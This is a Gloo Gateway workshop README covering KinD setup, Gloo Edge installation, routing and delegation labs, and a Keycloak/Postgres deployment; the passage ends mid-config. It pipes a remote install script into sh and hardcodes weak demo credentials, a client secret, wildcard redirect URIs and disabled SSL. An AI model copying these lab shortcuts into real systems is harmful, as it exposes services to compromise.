
<!--bash
source ./scripts/assert.sh
-->



<center>
<img src="images/document-gloo-gateway.svg" style="height: 100px;"/>
</center>

# <center>Gloo Gateway Workshop</center>



## Table of Contents
* [Introduction](#introduction)
* [Lab 1 - Deploy KinD Cluster(s)](#lab-1---deploy-kind-cluster(s)-)
* [Lab 2 - Deploy Gloo Edge](#lab-2---deploy-gloo-edge-)
* [Lab 3 - Traffic management](#lab-3---traffic-management-)
* [Lab 4 - Deploy Keycloak](#lab-4---deploy-keycloak-)
* [Lab 5 - Security and authentication](#lab-5---security-and-authentication-)
* [Lab 6 - OPA authorization](#lab-6---opa-authorization-)
* [Lab 7 - Data Transformations - Request transformations](#lab-7---data-transformations---request-transformations-)
* [Lab 8 - Rate limiting](#lab-8---rate-limiting-)
* [Lab 9 - Web application firewall](#lab-9---web-application-firewall-)
* [Lab 10 - Observability](#lab-10---observability-)
* [Lab 11 - Deploy Gloo Gateway](#lab-11---deploy-gloo-gateway-)
* [Lab 12 - Deploy the httpbin demo app](#lab-12---deploy-the-httpbin-demo-app-)
* [Lab 13 - Expose the httpbin application through the gateway](#lab-13---expose-the-httpbin-application-through-the-gateway-)
* [Lab 14 - Delegate with control](#lab-14---delegate-with-control-)
* [Lab 15 - Modify the requests and responses](#lab-15---modify-the-requests-and-responses-)
* [Lab 16 - Split traffic between 2 backend services](#lab-16---split-traffic-between-2-backend-services-)
* [Lab 17 - Securing the access with OAuth](#lab-17---securing-the-access-with-oauth-)
* [Lab 18 - Use the transformation filter to manipulate headers](#lab-18---use-the-transformation-filter-to-manipulate-headers-)
* [Lab 19 - Apply rate limiting to the Gateway](#lab-19---apply-rate-limiting-to-the-gateway-)
* [Lab 20 - Use the JWT filter to validate JWT and create headers from claims](#lab-20---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-)
* [Lab 21 - Use the Web Application Firewall filter](#lab-21---use-the-web-application-firewall-filter-)
* [Lab 22 - Validate and authorize client certificates](#lab-22---validate-and-authorize-client-certificates-)
* [Lab 23 - Use the `cache-control` response header to cache responses](#lab-23---use-the-`cache-control`-response-header-to-cache-responses-)
* [Lab 24 - Deploy Argo Rollouts](#lab-24---deploy-argo-rollouts-)
* [Lab 25 - Roll out a new app version using Argo Rollouts](#lab-25---roll-out-a-new-app-version-using-argo-rollouts-)
* [Lab 26 - Deploy the Bookinfo sample application](#lab-26---deploy-the-bookinfo-sample-application-)
* [Lab 27 - Expose the productpage API securely](#lab-27---expose-the-productpage-api-securely-)
* [Lab 28 - Expose an external API and stitch it with the productpage API](#lab-28---expose-an-external-api-and-stitch-it-with-the-productpage-api-)
* [Lab 29 - Expose the dev portal backend](#lab-29---expose-the-dev-portal-backend-)
* [Lab 30 - Deploy and expose the dev portal frontend](#lab-30---deploy-and-expose-the-dev-portal-frontend-)
* [Lab 31 - Demonstrate the self service capabilities](#lab-31---demonstrate-the-self-service-capabilities-)
* [Lab 32 - Dev portal monetization](#lab-32---dev-portal-monetization-)
* [Lab 33 - Deploy Backstage with the backend plugin](#lab-33---deploy-backstage-with-the-backend-plugin-)
* [Lab 34 - Deploy OpenTelemetry Collector](#lab-34---deploy-opentelemetry-collector-)



## Introduction <a name="introduction"></a>

<a href="https://www.solo.io/products/gloo-gateway/">Gloo Gateway</a> is a feature-rich, fast, and flexible Kubernetes-native ingress controller and next-generation API gateway that is built on top of <a href="https://www.envoyproxy.io/">Envoy proxy</a> and the <a href="https://gateway-api.sigs.k8s.io/">Kubernetes Gateway API</a>).

Gloo Gateway is fully conformant with the Kubernetes Gateway API and extends its functionality with Solo’s custom Gateway APIs, such as `RouteOption`, `VirtualHostOption`, `Upstream`s, `RateLimitConfig`, or `AuthConfig`.
These resources help to centrally configure routing, security, and resiliency rules for a specific component, such as a host, route, or gateway listener.

These capabilities are grouped into two editions of Gloo Gateway:

### Open source (OSS) Gloo Gateway

Use Kubernetes Gateway API-native features and the following Gloo Gateway extensions to configure basic routing, security, and resiliency capabilities:

* Access logging
* Buffering
* Cross-Origin Resource Sharing (CORS)
* Cross-Site Request Forgery (CSRF)
* Fault injection
* Header control
* Retries
* Timeouts
* Traffic tapping
* Transformations

### Gloo Gateway Enterprise Edition

In addition to the features provided by the OSS edition, many more features are available in the Enterprise Edition, including:

* External authentication and authorization
* External processing
* Data loss prevention
* Developer portal
* JSON web token (JWT)
* Rate limiting
* Response caching
* Web Application Filters

### Want to learn more about Gloo Gateway?

In the labs that follow we present some of the common patterns that our customers use and provide a good entry point into the workings of Gloo Gateway.

You can find more information about Gloo Gateway in the official documentation: <https://docs.solo.io/gateway/>.




## Lab 1 - Deploy KinD Cluster(s) <a name="lab-1---deploy-kind-cluster(s)-"></a>


Clone this repository and go to the directory where this `README.md` file is.



Set the context environment variables:

```bash
export CLUSTER1=cluster1
```

Deploy the KinD clusters:

```bash
bash ./data/steps/deploy-kind-clusters/deploy-cluster1.sh
```
Then run the following commands to wait for all the Pods to be ready:

```bash
./scripts/check.sh cluster1
```

**Note:** If you run the `check.sh` script immediately after the `deploy.sh` script, you may see a jsonpath error. If that happens, simply wait a few seconds and try again.

Once the `check.sh` script completes, execute the `kubectl get pods -A` command, and verify that all pods are in a running state.
<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Clusters are healthy", () => {
    const clusters = ["cluster1"];

    clusters.forEach(cluster => {
        it(`Cluster ${cluster} is healthy`, () => helpers.k8sObjectIsPresent({ context: cluster, namespace: "default", k8sType: "service", k8sObj: "kubernetes" }));
    });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-kind-clusters/tests/cluster-healthy.test.js.liquid from lab number 1"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 1"; exit 1; }
-->




## Lab 2 - Deploy Gloo Edge <a name="lab-2---deploy-gloo-edge-"></a>

With the cluster created our next step is to install Gloo Edge on the cluster. 



<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;

describe("Required environment variables should contain value", () => {
  it("Gloo Edge licence environment variables should not be empty", () => {
    expect(process.env.LICENSE_KEY).not.to.be.empty
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/imported/gloo-edge/templates/steps/deploy-gloo-edge/tests/environment-variables.test.js.liquid from lab number 2"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 2"; exit 1; }
-->

Run the commands below to deploy the Gloo Edge Enterprise components:



```bash
curl -sL https://run.solo.io/gloo/install | sh
export PATH=$HOME/.gloo/bin:$PATH


helm repo add gloo-ee-helm https://storage.googleapis.com/gloo-ee-helm

helm repo add glooe https://storage.googleapis.com/gloo-ee-helm
helm repo update
helm upgrade --install gloo-gateway gloo-ee-helm/gloo-ee --namespace gloo-system \
  --create-namespace --version 1.18.9 --set-string license_key=$LICENSE_KEY --devel
```

Use the following commands to wait for the Gloo Edge components to be deployed:

<!--bash
sleep 2
-->

```bash
kubectl -n gloo-system rollout status deploy gloo gateway-proxy redis extauth rate-limit
```
With the components up and running, we are ready to showcase Gloo Edge with practical examples.




## Lab 3 - Traffic management <a name="lab-3---traffic-management-"></a>

## Deploy Services

In this step, you will expose two services to the outside world using Gloo Edge.

First, let's deploy the **httpbin** service. `httpbin` is an open-source application useful to debug routing, headers in requests and responses, status codes, and so on. The public online version of it can be found at [httpbin.org](https://httpbin.org).

Begin by creating a namespace and then deploy the service.

```bash
kubectl create ns httpbin

kubectl -n httpbin apply -f https://raw.githubusercontent.com/solo-io/workshops/master/gloo-edge/data/httpbin.yaml
```

We will additionally deploy the `echo` service, which replies with a static text.

```bash
kubectl create ns echo

kubectl -n echo apply -f https://raw.githubusercontent.com/solo-io/workshops/master/gloo-edge/data/echo-service.yaml
```
<!--bash
kubectl rollout status deployment -n echo
kubectl rollout status deployment -n httpbin
-->

The currently deployed services are shown in the figure below.

![Gloo Edge with `httpbin` and the `echo` service](images/steps/gloo-edge/traffic-management/deployed-services.png)

## Understanding the `Upstream` resource

In Gloo Edge, an `Upstream` defines destinations where traffic can be routed. Upstreams tell Gloo Edge how to route traffic to the workloads behind it. Those workloads can be Kubernetes Services, aws EC2 instances, Lambda Functions, and so on.

> Note: To learn more about `Upstreams` check the [Upstream API documentation](https://docs.solo.io/gloo-edge/latest/reference/api/github.com/solo-io/gloo/projects/gloo/api/v1/upstream.proto.sk/#upstream)

This is cool and all, but do "I" have to create all the upstreams? *sad

No, Gloo Edge does it for you! It uses a discovery mechanism to create upstreams automatically! This covers the majority of the cases, but whenever you are using a resource that is not automatically discovered, remember that you can create the upstream manually using Kubernetes CRs.

After deploying the httpbin service, Gloo Edge discovers and creates an `Upstream` for it called `httpbin-httpbin-8000` (Gloo Edge uses the convention `<namespace>-<service>-<port>` for the discovered Upstreams).

![Upstream discovery](images/steps/gloo-edge/traffic-management/creation-of-upstreams.png)
Gloo Edge upstream discovery:

- (1) Watches for Kubernetes Services
- (2) Uses the information to create Upstream CR and applies those to the Kubernetes cluster

To verify that the Upstream was created, run the following command:

<!--bash
echo waiting for upstream httpbin-httpbin-8000 to be discovered
until glooctl get upstream httpbin-httpbin-8000 2> /dev/null
do
    printf '.'
    sleep 3
done
printf '\n'
-->

```bash
glooctl get upstream httpbin-httpbin-8000
```

The output shows the discovered upstream with an `Accepted` status:

```,nocopy
+----------------------+------------+----------+------------------------+
|       UPSTREAM       |    TYPE    |  STATUS  |        DETAILS         |
+----------------------+------------+----------+------------------------+
| httpbin-httpbin-8000 | Kubernetes | Accepted | svc name:      httpbin |
|                      |            |          | svc namespace: httpbin |
|                      |            |          | port:          8000    |
|                      |            |          |                        |
+----------------------+------------+----------+------------------------+
```

Similarly, Gloo Edge has created upstreams for the `echo` service and all the other existing services in the cluster. To list all of the upstreams execute the following command:

```bash
glooctl get upstream
```

The upstream resources are stored in the cluster as Kubernetes Custom Resources. You can query those using kubectl, as shown below:

```bash
kubectl get upstreams -n gloo-system
```

The response should look something like below. Notice both the `echo-echo-v1-8080` and `httpbin-httpbin-8000` upstreams that were discovered as part of this exercise.

```,nocopy
NAME                                                   AGE
default-kubernetes-443                                 28m
echo-echo-v1-8080                                      5m3s
extauth                                                28m
gloo-system-extauth-8083                               28m
gloo-system-gateway-443                                28m
gloo-system-gateway-proxy-443                          28m
gloo-system-gateway-proxy-80                           28m
gloo-system-gloo-9976                                  28m
gloo-system-gloo-9977                                  28m
gloo-system-gloo-9979                                  28m
gloo-system-gloo-9988                                  28m
gloo-system-gloo-fed-console-10101                     28m
gloo-system-gloo-fed-console-8081                      28m
gloo-system-gloo-fed-console-8090                      28m
gloo-system-glooe-grafana-80                           28m
gloo-system-glooe-prometheus-kube-state-metrics-8080   28m
gloo-system-glooe-prometheus-server-80                 28m
gloo-system-rate-limit-18081                           28m
gloo-system-redis-6379                                 28m
httpbin-httpbin-8000                                   5m19s
kube-system-kube-dns-53                                28m
kube-system-kube-dns-9153                              28m
rate-limit                                             28m
```

## Using `VirtualServices` you can route traffic to an `Upstream`

`VirtualService` is another Custom Resource Definition created by Gloo Edge. Those configure the Envoy proxy to route traffic to upstreams. Because the upstreams are already created, all we need to do is expose and route traffic to those with a virtual service.

Let's create a Virtual Service that routes all incoming traffic to the `httpbin` service.

```bash
kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs
  namespace: gloo-system
spec:
  virtualHost:
    domains:
      - '*'
    routes:
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
EOF
```
Now you can access the `httpbin` application in the web browser by running the following command:

```
/opt/google/chrome/chrome $(glooctl proxy url)
```

> Note: The nested command `glooctl proxy url` returns the endpoint in which the Gloo Edge Envoy proxy is exposed. Take the time and investigate `glooctl` and the utilities it exposes.

On the web browser, you'll see the `httpbin` application webpage.

![`httpbin` Web Interface](images/steps/gloo-edge/traffic-management/httpbin-ui.png)

Now, create another route entry for the `echo` service. First, let's consider what property of the request we should use to make the routing decision. Gloo Edge is versatile and you can route based on many properties such as headers, hostname, path-based routing, and so on.

While surfing the web end-users will type the hostname in the web browser address bar, for e.g.  `echo.solo.io`. After that the browser uses Domain Name Servers (DNS) configured on the operating system to resolve the typed hostname to an IP address.

After the resolution, a TCP connection is initiated to that IP address and the hostname (in this example `echo.solo.io`) is added to the request as an HTTP Header, specifically the `Host` header for HTTP/1, and as the `:authority` header for HTTP/2. Because Envoy internally uses the HTTP/2 version of this header we refer to it with the latter header.

In order to route traffic to the `echo` service for the hostname `echo.solo.io` we define the following virtual service.

```bash
kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs
  namespace: gloo-system
spec:
  virtualHost:
    domains:
      - '*'
    routes:
      - matchers:
          - prefix: /
            headers:
            - name: ":authority"
              value: "echo.solo.io"
        routeAction:
          single:
            upstream:
              name: echo-echo-v1-8080
              namespace: gloo-system
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
EOF
```

Because public DNS servers don't have the entry (that we just made up), we have to manually specify the Host header in the request as shown below:

```bash,noexecute
curl -H "Host: echo.solo.io" $(glooctl proxy url)/
```

The server responds with `version-1`, which indicates that traffic was properly routed to the `echo` service using the host header.
Instead of typing the host header in each request, we can configure the systems hosts file to resolve our sample domains.

> **NOTE:** The `/etc/hosts` file is the first stop for the operating system to resolve a hostname. Thus when configuring the hostname with static entries those will be resolved by all applications.

Configure your hosts file to resolve the hostnames to the IP address of the proxy by executing the following command:

```
PROXY_IP=$(kubectl get svc -n gloo-system gateway-proxy \
    -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')

echo | sudo tee -a /etc/hosts
echo "$PROXY_IP echo.solo.io" | sudo tee -a /etc/hosts
echo "$PROXY_IP httpbin.solo.io" | sudo tee -a /etc/hosts
```

<!--bash
if ! grep -q 'echo.solo.io' /etc/hosts; then
  PROXY_IP=$(kubectl get svc -n gloo-system gateway-proxy \
      -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')

  echo | sudo tee -a /etc/hosts
  echo "$PROXY_IP echo.solo.io" | sudo tee -a /etc/hosts
  echo "$PROXY_IP httpbin.solo.io" | sudo tee -a /etc/hosts
fi
-->
To test that the hostnames are resolved open chrome and instead of the IP use the hostname. You can do so by running the following command:

```
/opt/google/chrome/chrome http://echo.solo.io
```

And sure enough, you should see the static text "version-1".

## Gloo Edge configuration to route traffic to a workload

There are quite a few resources involved to route traffic to the upstream. Those are visualized in the figure below.

![Gloo Edge configuration](images/steps/gloo-edge/traffic-management/gloo-edge-config.png)

We already got to know the `VirtualService` and the `Upstream` resource definitions.  So let's take a closer look at the `Gateway` resource.

## `Gateway` configures the proxy to admit traffic

The `Gateway` resource configures the proxy to admit traffic for an address and a port.

As most services will want to expose services on port 443 and port 80, gateways that expose those ports are created by default. Verify that by listing all `Gateway` resources.

```bash,noexecute
kubectl get gateway -n gloo-system
```

Which prints the following.

```,nocopy
NAME                AGE
gateway-proxy       58m
gateway-proxy-ssl   58m
```

To learn more let's print the definition of the `Gateway` named `gateway-proxy`.

```bash,noexecute
kubectl get gateway gateway-proxy -n gloo-system -o yaml
```

This prints out the following definition:

```yaml,nocopy
apiVersion: gateway.solo.io/v1
kind: Gateway
metadata:
  name: gateway-proxy
  namespace: gloo-system
spec:
  bindAddress: '::'
  bindPort: 8080
  httpGateway: {}
  proxyNames:
  - gateway-proxy
  useProxyProto: false
```

This configures the proxy to admit traffic on port 8080 for all addresses. When checking the gateway `gateway-proxy-ssl` you'll see that it listens on port 8443 and additionally sets the ssl property to true.

## Delegation

In the previous example, we set up a `VirtualService` that routes traffic to two different applications. Those applications might be operated by different teams. At the surface, this might seem fine, but it violates the isolation principle of multi-tenant environments. If one team makes changes to the `VirtualService` (such as prototyping with a new app), a misconfiguration of theirs can break the routing for the apps of other teams.

> Multi-tenant environments require tenant isolation to ensure that the mishaps of one tenant don't impact other tenants.

Gloo Edge provides a feature referred to as _delegation_ that makes routing configuration multi-tenant friendly. Using delegation routing configuration can be assembled from separate config objects. The root config object delegates responsibility to other objects, forming a tree of config objects. The tree always has a virtual service as its root, which delegates to any number of route tables. Route tables can further delegate to other route tables.

Use cases for delegation include:

- Allowing multiple tenants to own add, remove, and update routes without requiring shared access to the root-level Virtual Service
- Sharing route configuration between Virtual Services
- Simplifying blue-green routing configurations by swapping the target Route Table for a delegated route.
- Simplifying very large routing configurations for a single Virtual Service
- Restricting ownership of routing configuration for a tenant to a subset of the whole Virtual Service.

![Delegation](images/steps/gloo-edge/traffic-management/delegation.png)

Let's rewrite your Virtual Service to delegate the routing to a `RouteTable`.

The first resource is the delegated Route Table. The second resource is a Virtual Service. Notice that there is a new `delegateAction` referencing the just created `RouteTable`.

```bash
kubectl apply -f - <<EOF
# ------------- Delegation resource -----------------------
apiVersion: gateway.solo.io/v1
kind: RouteTable
metadata:
  name: echo-routetable
  namespace: echo
spec:
  routes:
    - matchers:
        - prefix: /
          headers:
          - name: ":authority"
            value: "echo.solo.io"
      routeAction:
        single:
          upstream:
            name: echo-echo-v1-8080
            namespace: gloo-system
# ---------------------------------------------------------
---
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs
  namespace: gloo-system
spec:
  virtualHost:
    domains:
      - '*'
    routes:
      - matchers:
        - prefix: /
          headers:
          - name: ":authority"
            value: "echo.solo.io"
# ------------- Delegation action by reference ------------
        delegateAction:
          ref:
            name: 'echo-routetable'
            namespace: 'echo'
# ---------------------------------------------------------
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
EOF
```

Breaking the route table from the virtual service enables the separation of concerns. Development teams can maintain the route table and configure properties specific for routing to their services. Meanwhile, administrators can define higher-level options. Such as firewall rules, authentication of requests, and so on.

## Delegation By Label Selector

Another way to delegate is using labels. This approach helps you to create dynamic references thus you don't need to change the Virtual service for every new route table.

Let's add a label to the previously created route table.

```bash
kubectl apply -f - <<EOF
---
apiVersion: gateway.solo.io/v1
kind: RouteTable
metadata:
  name: echo-routetable
  namespace: echo
# ------------- Label to use as dynamic reference ---------
  labels:
    application-owner: team1
# ---------------------------------------------------------
spec:
  routes:
    - matchers:
        - prefix: /
          headers:
          - name: ":authority"
            value: "echo.solo.io"
      routeAction:
        single:
          upstream:
            name: echo-echo-v1-8080
            namespace: gloo-system
EOF
```

And then configure the virtual service to select it using labels.

```bash
kubectl apply -f - <<EOF
---
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs
  namespace: gloo-system
spec:
  virtualHost:
    domains:
      - '*'
    routes:
      - matchers:
        - prefix: /
          headers:
          - name: ":authority"
            value: "echo.solo.io"
# ------------- Delegation by label selector --------------
        delegateAction:
          selector:
            namespaces:
              - echo
            labels:
              application-owner: team1
# ---------------------------------------------------------
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
EOF
```

Now teams within the `echo` namespace can create multiple route tables on how to route traffic to their services without making changes to the virtual service. You can try the same commands as previous and everything works the same.

## Routing to Multiple Upstreams

In many cases, you need to route traffic to two different versions of an application. Such as testing a new feature using A/B Testing, and so on. In this step, you are going to update the Virtual Service to route traffic to two different `Upstreams`.

Begin by creating a new deployment of the **echo** service (which represents another upstream), this time it returns the text `version-2`. Apply it to the cluster:

```bash
kubectl -n echo apply -f https://raw.githubusercontent.com/solo-io/workshops/master/gloo-edge/data/echo-v2-service.yaml
```

Verify that the upstream for the second version of the echo service is created.

<!--bash
echo waiting for upstream echo-echo-v2-8080 to be discovered
until glooctl get upstream echo-echo-v2-8080 2> /dev/null
do
    sleep 3
done
-->

```bash,noexecute
glooctl get upstream echo-echo-v2-8080
```

This will print the following:

```
+-------------------+------------+----------+------------------------+
|     UPSTREAM      |    TYPE    |  STATUS  |        DETAILS         |
+-------------------+------------+----------+------------------------+
| echo-echo-v2-8080 | Kubernetes | Accepted | svc name:      echo-v2 |
|                   |            |          | svc namespace: echo    |
|                   |            |          | port:          8080    |
|                   |            |          |                        |
+-------------------+------------+----------+------------------------+
```

You can route to multiple upstreams by updating the route table as follows:

```bash
kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteTable
metadata:
  name: echo-routetable
  namespace: echo
  labels:
    application-owner: team1
spec:
  routes:
    - matchers:
        - prefix: /
          headers:
          - name: ":authority"
            value: "echo.solo.io"
      routeAction:
# ----------------------- Multi Destination ------------------
        multi:
            destinations:
            - weight: 5
              destination:
                  upstream:
                      name: echo-echo-v1-8080
                      namespace: gloo-system
            - weight: 5
              destination:
                  upstream:
                      name: echo-echo-v2-8080
                      namespace: gloo-system
# ------------------------------------------------------------
EOF
```

After applying the updated `RouteTable`, the proxy splits traffic equally across versions.

![Weighted Routing Diagram](images/steps/gloo-edge/traffic-management/weighted-routing.png)

You can verify that requests are load-balanced equally by refreshing the page and verifying that the versions switch between **version-1** and **version-2** approximately equally. Or execute the command below that makes 10 requests in a row.

```bash,noexecute
for i in {1..10}; do curl -s echo.solo.io; done
```

Output:

```,nocopy
version-1
version-2
version-2
version-1
...
```

The output shows that the traffic is split across versions 1 and 2 of the echo app. This allows teams to gradually release traffic to a new version of an app, and such scopes the mishaps to only a small percentage of your users (in case there was something wrong with the new version of the service).

> NOTE: The change was entirely done in the RouteTable. The RouteTable resided within the team's namespace. Thus in multi-tenant environments, other teams are protected from the misconfigurations of each other.

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

// ToDo update and check that both versions are returned v1 and v2
describe(`Echo Service is available using host header "echo.solo.io"`, () => {
  it(`traffic routed to echo service when using the header "echo.solo.io"`, () => 
    helpers.checkURL({ host: `http://echo.solo.io`, retCode: 200 }));
})

describe("httpbin receives requests that don't specify the host header", () => {
  it('traffic routed to httpbin when no host specified', () => 
    helpers.checkURL({ host: `http://httpbin.solo.io`, retCode: 200 }));
})

EOF
echo "executing test dist/gloo-gateway-workshop/build/imported/gloo-edge/templates/steps/traffic-management/tests/verify-routing.test.js.liquid from lab number 3"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 3"; exit 1; }
-->




## Lab 4 - Deploy Keycloak <a name="lab-4---deploy-keycloak-"></a>

In many use cases, you need to restrict the access to your applications to authenticated users.

OpenID Connect (OIDC) is an identity layer on top of the OAuth 2.0 protocol. In OAuth 2.0 flows, authentication is performed by an external Identity Provider (IdP) which, in case of success, returns an Access Token representing the user identity. The protocol does not define the contents and structure of the Access Token, which greatly reduces the portability of OAuth 2.0 implementations.

The goal of OIDC is to address this ambiguity by additionally requiring Identity Providers to return a well-defined ID Token. OIDC ID tokens follow the JSON Web Token standard and contain specific fields that your applications can expect and handle. This standardization allows you to switch between Identity Providers – or support multiple ones at the same time – with minimal, if any, changes to your downstream services; it also allows you to consistently apply additional security measures like Role-Based Access Control (RBAC) based on the identity of your users, i.e. the contents of their ID token.

In this lab, we're going to install Keycloak. It will allow us to set up OIDC workflows later.

But, first of all, we're going to deploy Keycloak to persist the data if Keycloak restarts.

```bash
kubectl --context ${CLUSTER1} create namespace gloo-system
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: postgres
  namespace: gloo-system
---
apiVersion: v1
kind: Secret
metadata:
  name: postgres-secrets
  namespace: gloo-system
type: Opaque
data:
  POSTGRES_DB: ZGI=
  POSTGRES_USER: YWRtaW4=
  POSTGRES_PASSWORD: YWRtaW4=
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: postgres-pvc
  namespace: gloo-system
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 5Gi
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: postgres
  namespace: gloo-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: postgres
  template:
    metadata:
      labels:
        app: postgres
    spec:
      serviceAccountName: postgres
      volumes:
        - name: postgres-storage
          persistentVolumeClaim:
            claimName: postgres-pvc
      containers:
        - name: postgres
          image: postgres:13.2-alpine
          imagePullPolicy: 'IfNotPresent'
          ports:
            - containerPort: 5432
          envFrom:
            - secretRef:
                name: postgres-secrets
          volumeMounts:
            - name: postgres-storage
              mountPath: /var/lib/postgresql/data
              subPath: postgres
---
apiVersion: v1
kind: Service
metadata:
  name: postgres
  namespace: gloo-system
spec:
  selector:
    app: postgres
  ports:
    - port: 5432
EOF
```

Wait while Postgres finishes rolling out:

```bash
kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy/postgres

sleep 5
```

Create the database and user for Keycloak:

```bash
kubectl --context ${CLUSTER1} -n gloo-system exec deploy/postgres -- psql -U admin -d db -c "CREATE DATABASE keycloak;"
kubectl --context ${CLUSTER1} -n gloo-system exec deploy/postgres -- psql -U admin -d db -c "CREATE USER keycloak WITH PASSWORD 'password';"
kubectl --context ${CLUSTER1} -n gloo-system exec deploy/postgres -- psql -U admin -d db -c "GRANT ALL PRIVILEGES ON DATABASE keycloak TO keycloak;"
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Postgres", () => {
  it('postgres pods are ready in cluster1', () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "gloo-system", k8sObj: "postgres" }));
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-keycloak/tests/postgres-available.test.js.liquid from lab number 4"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 4"; exit 1; }
-->

First, we need to define an ID and secret for a "client", which will be the service that delegates to Keycloak for authorization:

```bash
KEYCLOAK_CLIENT=gloo-ext-auth
KEYCLOAK_SECRET=hKcDcqmUKCrPkyDJtCw066hTLzUbAiri
```

We need to store these in a secret accessible by the ext auth service:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: oauth
  namespace: gloo-system
type: extauth.solo.io/oauth
stringData:
  client-id: ${KEYCLOAK_CLIENT}
  client-secret: ${KEYCLOAK_SECRET}
EOF
```

We need to supply the initial configuration of the realm we'll use for these labs.
This will include the client with the ID and secret we defined above, as well as two users that we can use later:

- User1 credentials: `user1/password`
  Email: user1@example.com

- User2 credentials: `user2/password`
  Email: user2@solo.io

Create this configuration in a `ConfigMap`:

```bash
kubectl --context ${CLUSTER1} create namespace keycloak

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
data:
  workshop-realm.json: |-
    {
      "realm": "workshop",
      "enabled": true,
      "displayName": "solo.io",
      "accessTokenLifespan": 1800,
      "sslRequired": "none",
      "users": [
        {
          "username": "user1",
          "enabled": true,
          "email": "user1@example.com",
          "attributes": {
            "group": [
              "users"
            ],
            "subscription": [
              "enterprise"
            ]
          },
          "credentials": [
            {
              "type": "password",
              "secretData": "{\"value\":\"JsfNbCOIdZUbyBJ+BT+VoGI91Ec2rWLOvkLPDaX8e9k=\",\"salt\":\"P5rtFkGtPfoaryJ6PizUJw==\",\"additionalParameters\":{}}",
              "credentialData": "{\"hashIterations\":27500,\"algorithm\":\"pbkdf2-sha256\",\"additionalParameters\":{}}"
            }
          ]
        },
        {
          "username": "user2",
          "enabled": true,
          "email": "user2@solo.io",
          "attributes": {
            "group": [
              "users"
            ],
            "subscription": [
              "free"
            ],
            "show_personal_data": [
              "false"
            ]
          },
          "credentials": [
            {
              "type": "password",
              "secretData": "{\"value\":\"RITBVPdh5pvXOa4JzJ5pZTE0rG96zhnQNmSsKCf83aU=\",\"salt\":\"drB9e5Smf3cbfUfF3FUerw==\",\"additionalParameters\":{}}",
              "credentialData": "{\"hashIterations\":27500,\"algorithm\":\"pbkdf2-sha256\",\"additionalParameters\":{}}"
            }
          ]
        },
        {
          "username": "admin1",
          "enabled": true,
          "email": "admin1@solo.io",
          "attributes": {
            "group": [
              "admin"
            ],
            "show_personal_data": [
              "false"
            ]
          },
          "credentials": [
            {
              "type": "password",
              "secretData" : "{\"value\":\"BruFLfFkjH/8erZ26NnrbkOrWiZuQyDRCHD9o0R6Scg=\",\"salt\":\"Cf9AYCE5pAbb4CKEF0GUTA==\",\"additionalParameters\":{}}",
              "credentialData" : "{\"hashIterations\":5,\"algorithm\":\"argon2\",\"additionalParameters\":{\"hashLength\":[\"32\"],\"memory\":[\"7168\"],\"type\":[\"id\"],\"version\":[\"1.3\"],\"parallelism\":[\"1\"]}}"
            }
          ]
        }
      ],
      "clients": [
        {
          "clientId": "${KEYCLOAK_CLIENT}",
          "secret": "${KEYCLOAK_SECRET}",
          "redirectUris": [
            "*"
          ],
          "webOrigins": [
            "+"
          ],
          "authorizationServicesEnabled": true,
          "directAccessGrantsEnabled": true,
          "serviceAccountsEnabled": true,
          "protocolMappers": [
            {
              "name": "group",
              "protocol": "openid-connect",
              "protocolMapper": "oidc-usermodel-attribute-mapper",
              "config": {
                "claim.name": "group",
                "user.attribute": "group",
                "access.token.claim": "true",
                "id.token.claim": "true"
              }
            },
            {
              "name": "show_personal_data",
              "protocol": "openid-connect",
              "protocolMapper": "oidc-usermodel-attribute-mapper",
              "config": {
                "claim.name": "show_personal_data",
                "user.attribute": "show_personal_data",
                "access.token.claim": "true",
                "id.token.claim": "true"
              }
            },
            {
              "name": "subscription",
              "protocol": "openid-connect",
